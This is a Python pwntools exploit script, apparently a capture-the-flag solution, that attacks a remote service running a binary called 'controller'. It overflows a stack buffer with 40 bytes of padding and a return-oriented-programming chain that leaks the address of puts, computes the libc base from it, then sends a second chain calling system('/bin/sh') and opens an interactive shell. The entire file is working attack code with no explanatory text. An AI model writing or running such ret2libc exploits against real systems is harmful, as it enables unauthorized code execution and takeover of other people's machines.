from pwn import *

context(arch = 'amd64', os = 'linux')

libc = ELF('/mnt/c/Users/BitTheByte/Desktop/libc.so.6')
proc = remote("138.68.147.93",30812)#process("./controller")


def ropchain1():
    rop = ROP(elf)
    rop.puts(elf.got['puts'])
    rop.call(elf.symbols['main'])
    print(rop.dump())
    return rop.chain()

def ropchain2():
    rop = ROP(libc)
    rop.call(rop.ret[0])
    rop.system(next(libc.search(b'/bin/sh\x00')))
    print(rop.dump())
    return rop.chain()


elf  = ELF("./controller")

#gdb.attach(proc, '''
#set follow-fork-mode child
#break main
#continue
#''')


proc.sendline("-182 -359")
proc.recv()
proc.sendline("3")
proc.recv()
proc.sendline(b"A"*40  + ropchain1())
proc.recvuntil("> Problem ingored\n")

print("="* 99)
puts_base = proc.recvline()[:6]
puts_base = puts_base.ljust(8, b"\x00")
puts_base = u64(puts_base)
print(f"[+] puts_base: {hex(puts_base)}")
print("="* 99)


print("="* 99)
libc.address = puts_base - libc.symbols['puts']
print(f"puts@libc: {hex(puts_base)}")
print(f"Libc.puts@symbols: {hex(libc.symbols['puts'])}")
print(f"Libc@base: {hex(libc.address)}")
print("="* 99)


proc.sendline("-182 -359")
proc.recv()
proc.sendline("3")
proc.recv()
proc.sendline(b"A"*40  + ropchain2())
proc.recvuntil("> Problem ingored\n")

proc.interactive()
